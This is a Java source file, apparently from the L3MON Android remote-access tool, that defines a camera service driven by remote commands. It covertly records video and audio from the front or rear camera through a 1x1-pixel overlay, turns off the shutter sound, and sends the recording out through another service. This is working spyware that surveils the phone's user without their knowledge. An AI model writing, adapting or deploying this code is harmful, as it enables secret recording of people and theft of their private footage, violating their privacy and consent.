package com.etechd.l3mon;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class CamService extends Service implements SurfaceHolder.Callback {
    private static final String TAG = "Suprem";
    private static int currentapiVersion = Build.VERSION.SDK_INT;
    private static int typeForAudio = 1;
    private static int typeForVideo = 0;
    int buttonNumber = -1;
    private Camera camera = null;
    public String cmd;
    public File file;
    boolean isCameraQualityHigh = false;
    private MediaRecorder mediaRecorder = null;
    private String pathString;
    private int secs = 0;
    private TimerTask stopRecordingTimer;
    private SurfaceView surfaceView;
    private WindowManager windowManager;

    @Override
    public void onCreate() {
    }

    @Override
    public void onDestroy() {
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    @Override
    public int onStartCommand(Intent intent, int i, int i2) {
        Log.d(TAG, "onCreate service");
        this.buttonNumber = intent.getIntExtra("cam", 0);
        if (this.buttonNumber == 1) {
            this.cmd = "RC";
        } else {
            this.cmd = "FC";
        }
        this.secs = intent.getIntExtra(ConnectionManager.DURATION, 0);
        Log.d(TAG, new StringBuffer().append("onCreate service intent =").append(intent).toString());
        this.windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        this.surfaceView = new SurfaceView(this);
        this.windowManager.addView(this.surfaceView, new WindowManager.LayoutParams(1, 1, 2006, 262144, -3));
        this.surfaceView.getHolder().addCallback(this);
        return 2;
    }

    @Override
    @SuppressLint("NewApi")
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        this.mediaRecorder = new MediaRecorder();
        if (this.buttonNumber == 1 || this.buttonNumber == 2) {
            Log.d(TAG, "surfaceCreated  service");
            for (int i = 0; i < Camera.getNumberOfCameras(); i++) {
                System.out.println(new StringBuffer().append("camera n ").append(i).toString());
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                Camera.getCameraInfo(i, cameraInfo);
                if (this.buttonNumber == 1 && cameraInfo.facing == 0) {
                    Log.d(TAG, new StringBuffer().append("a =").append(this.buttonNumber).toString());
                    this.camera = Camera.open(0);
                    if (currentapiVersion >= 17 && cameraInfo.canDisableShutterSound) {
                        this.camera.enableShutterSound(false);
                    }
                } else if (this.buttonNumber == 2 && cameraInfo.facing == 1) {
                    Log.d(TAG, new StringBuffer().append("a =").append(this.buttonNumber).toString());
                    this.camera = Camera.open(1);
                    if (currentapiVersion >= 17 && cameraInfo.canDisableShutterSound) {
                        this.camera.enableShutterSound(false);
                    }
                }
            }
            this.camera.unlock();
        }
        if (this.buttonNumber == 1 || this.buttonNumber == 2) {
            this.mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
            this.mediaRecorder.setCamera(this.camera);
            this.mediaRecorder.setAudioSource(1);
            this.mediaRecorder.setVideoSource(1);
            Log.d(TAG, new StringBuffer().append("Quality isCameraQualityHigh =").append(this.isCameraQualityHigh).toString());
            if (!this.isCameraQualityHigh) {
                this.mediaRecorder.setProfile(CamcorderProfile.get(0));
            } else {
                this.mediaRecorder.setProfile(CamcorderProfile.get(1));
            }
            this.file = getFilePath(typeForVideo, this.buttonNumber);
            this.mediaRecorder.setOutputFile(this.file.getAbsolutePath());
        }
        if (this.buttonNumber == 1 || this.buttonNumber == 2 || this.buttonNumber == 3) {
            try {
                this.mediaRecorder.prepare();
            } catch (Exception e) {
            }
            Log.d(TAG, "Recording started ");
            this.mediaRecorder.start();
            this.stopRecordingTimer = new TimerTask() {
                @Override
                public void run() {
                    stopRecording();
                    ScreenRecorderService.sendVideo(cmd, file);
                    stopSelf();
                    Log.e("TAGG", "rec stopeed after sec");
                }
            };
            int intTimerSchedule = secs * 1000;
            if(intTimerSchedule == 0) intTimerSchedule = 200;
            new Timer().schedule(this.stopRecordingTimer, (long) (intTimerSchedule));
        }
    }

    private void stopRecording() {
        if(this.mediaRecorder == null){
            this.mediaRecorder.stop();
            this.mediaRecorder.reset();
            this.mediaRecorder.release();
        }
        if (this.buttonNumber == 1 || this.buttonNumber == 2) {
            this.camera.lock();
            this.camera.release();
        }
        this.windowManager.removeView(this.surfaceView);
        Log.d(TAG, "cam stopped ");
        stopSelf();
    }

    public static File getFilePath(int i, int i2) {
        File file2 = null;
        if (Environment.getExternalStorageState().equals("mounted")) {
            File file3 = new File(Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath());
            Log.d("TAGG", new StringBuffer().append("path cam ").append(Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath()).toString());
            if (file3.exists()) {
                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm", Locale.getDefault());
                if (i == 0) {
                    if (i2 == 1) {
                        file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("rear_").toString()).append("video_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".mp4").toString());
                    } else {
                        file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("front_").toString()).append("video_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".mp4").toString());
                    }
                }
                if (i == 1) {
                    file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("audio_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".mp3").toString());
                }
                if (i == 2) {
                    file2 = new File(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(file3.getPath()).append(File.separator).toString()).append("screenshot_").toString()).append(simpleDateFormat.format(new Date())).toString()).append(".png").toString());
                }
                return file2;
            }
        }
        return null;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}